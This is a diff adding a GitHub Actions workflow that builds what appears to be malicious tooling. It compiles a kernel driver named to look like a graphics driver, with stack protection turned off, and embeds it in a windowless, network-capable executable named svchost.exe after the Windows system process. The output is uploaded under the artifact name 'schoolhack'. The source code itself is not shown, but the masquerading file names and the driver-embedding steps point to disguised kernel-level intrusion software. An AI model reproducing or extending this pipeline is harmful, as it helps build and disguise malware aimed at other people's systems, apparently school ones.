@@ -1,0 +1,52 @@
+name: build
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-2022
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup WDK
+        uses: microsoft/setup-msbuild@v2
+
+      - name: Build driver
+        shell: cmd
+        run: |
+          call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
+          cd drv
+          cl /nologo /kernel /GS- /O2 /W3 /c NvRmDrv.c ^
+             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\km" ^
+             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\shared" ^
+             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\ucrt"
+          link /nologo /DRIVER /SUBSYSTEM:NATIVE /ENTRY:DriverEntry ^
+             /OUT:NvRmDrv.sys NvRmDrv.obj ^
+             /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\km\x64" ^
+             ntoskrnl.lib hal.lib ntstrsafe.lib BufferOverflowK.lib
+          cd ..
+
+      - name: Build bin2h
+        shell: cmd
+        run: |
+          g++ -O2 bin2h.cpp -o bin2h.exe
+          bin2h.exe drv\NvRmDrv.sys driver_blob.h
+
+      - name: Build svchost.exe
+        shell: cmd
+        run: |
+          g++ -O2 -municode -mwindows -static -static-libgcc -static-libstdc++ ^
+              main.cpp -o svchost.exe ^
+              -lnetapi32 -lws2_32 -ladvapi32 -luser32 -lgdi32 -lole32 -lshell32
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: schoolhack
+          path: |
+            svchost.exe
+            drv/NvRmDrv.sys
+            drv/NvRmDrv.cat
